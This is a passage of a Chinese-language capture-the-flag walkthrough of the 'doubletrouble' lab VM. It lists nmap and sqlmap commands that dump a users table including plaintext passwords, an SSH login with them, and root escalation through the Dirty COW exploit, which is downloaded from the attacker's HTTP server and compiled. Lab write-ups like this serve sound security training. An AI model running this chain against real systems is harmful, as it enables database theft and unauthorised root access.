    三、靶机二#

    3.1 靶机二部署#

    # 靶机一中开启临时服务器
python3 -m http.server 8080

# kali 新终端下载镜像
wget http://192.168.203.138:8080/doubletrouble.ova

    3.2 侦测#

    nmap检查到22和80端口，访问80端口，获得如图信息

    目录扫描没获得信息

    使用SQLmap工具，跳转到 SQLmap 教程

    sqlmap -u "http://192.168.203.139" --forms --dbs --batch

sqlmap -u "http://192.168.203.139" --forms -D doubletrouble --tables --batch

sqlmap -u "http://192.168.203.139" --forms -D doubletrouble -T users --columns --batch

sqlmap -u "http://192.168.203.139" --forms -D doubletrouble -T users -C "username,password" --dump --batch
    第一步 第二步 第三步 第四步

    获得信息如下： Database：doubletrouble Table：users username：montreux, clapton password：GfsZxc1, ZubZub99

    3.3 登录#

    在80端口的页面登录，失败 用ssh连接，ssh clapton@192.168.203.139使用 clapton+ZubZub99 登录成功

    3.4 提权#

    uname -a： Linux doubletrouble 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux

    选择Dirty COW40839.c

    searchsploit -m 40839

    接着让靶机获取kali中的脚本 kali创建一个http服务器：python -m http.server 80 靶机使用wget：wget http://192.168.203.129/40839.c

    接着根据作者提示： 

    gcc -pthread 40839.c -o dirty -lcrypt
./dirty
su firefart
